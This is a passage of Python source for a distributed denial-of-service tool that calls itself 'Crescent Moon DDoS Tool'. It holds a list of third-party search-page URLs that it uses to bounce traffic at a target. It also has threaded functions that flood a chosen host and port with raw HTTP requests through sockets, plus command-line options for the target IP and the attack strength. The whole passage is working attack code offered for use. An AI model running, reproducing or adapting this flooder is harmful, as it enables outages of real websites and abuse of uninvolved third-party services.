	bots.append('http://www.shodanhq.com/search?q=')
	bots.append('http://ytmnd.com/search?q=')
	bots.append('http://www.usatoday.com/search/results?q=')
	bots.append('http://engadget.search.aol.com/search?q=')
	bots.append('https://steamcommunity.com/market/search?q=')
	bots.append('http://filehippo.com/search?q=')
	bots.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	bots.append('http://eu.battle.net/wow/en/search?q=')
	bots.append('http://engadget.search.aol.com/search?q=')
	bots.append('http://careers.gatesfoundation.org/search?q=')
	bots.append('http://techtv.mit.edu/search?q=')
	bots.append('http://www.ustream.tv/search?q=')
	bots.append('http://www.ted.com/search?q=')
	bots.append('http://funnymama.com/search?q=')
	bots.append('http://itch.io/search?q=')
	bots.append('http://jobs.rbs.com/jobs/search?q=')
	bots.append('http://taginfo.openstreetmap.org/search?q=')
	bots.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	bots.append('https://play.google.com/store/search?q=')
	bots.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	bots.append('http://www.reddit.com/search?q=')
	bots.append('http://www.bestbuytheater.com/events/search?q=')
	bots.append('https://careers.carolinashealthcare.org/search?q=')
	bots.append('http://jobs.leidos.com/search?q=')
	bots.append('http://jobs.bloomberg.com/search?q=')
	bots.append('https://www.pinterest.com/search/?q=')
	bots.append('http://millercenter.org/search?q=')
	bots.append('https://www.npmjs.com/search?q=')
	bots.append('http://www.evidence.nhs.uk/search?q=')
	bots.append('http://www.shodanhq.com/search?q=')
	bots.append('http://ytmnd.com/search?q=')
	bots.append('http://www.google.com/?q=')
	return(bots)


def bots_reloading(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print(GR+"► Reloading some requests for keep attacking ◄")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print (P+"► Sending HTTP Requests please be patient ◄")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mno connection! server maybe down\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bots_reloading(random.choice(bots)+"http://"+host)
		w.task_done()


def slowprint(s):
    for c in s + '/sl':
        sys.stdout.write(c)
        sys.stdout.flush() # defeat buffering
        time.sleep(8./90)


def usage():
	print (W+'''                            .-""""-                                   
                           F   .-'                                    
                          F   J                                       
                         I    I  rescent                                     
                          L   `.       Moon                              
                           L    `-._,                                 
                            `-.__.-' '''+P+'''            ##                    
                                               ###
                       #                      ####
              _____   ##                 .---#####-...__             
          .--'     `-###          .--..-'    ######     ""`---....   
 _____.----.        ###`.._____ .'          #######                  
 a:f                ###       /       -.    ####### _.---            
                    ###     .(              #######                  
                     #      : `--...        ######                   
                     #       `.     ``.     ######                   
                               :       :.    #####                   
                             .'          )    ###                    
                           .'            /    ##                     
                        _.'              |   .##                     
                      ,:'               |     '
        '''+W+'''    Crescent Moon DDoS Tool created By Anons'''+W+'''        
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬'''+P+'''
 python3 CrescentMoon.py   |-s or --server |-p or --port |-l or --level
 --server or -s: server for attack ip                          
 --port or -p: port default 80                                 
 --level or -l: power of attack default 60                     
'''+W+'''▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬''')
	sys.exit()



def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Suicide")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-l","--level",type="int",dest="level",help="default 135 -t 135")

	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.level is None:
		thr = 60
	else:
		thr = opts.level


# reading headers
global data
headers = open("httpconection.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[94m▷   ",host," connecting on port: ",str(port)," level of attack: ",str(thr),"   ◁\033[0m")
	print("\033[94m▷             Loading threads for start attack...                      ◁")
	user_agent()
	HAXSTROKE_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91mcheck server ip and port\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2) 
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
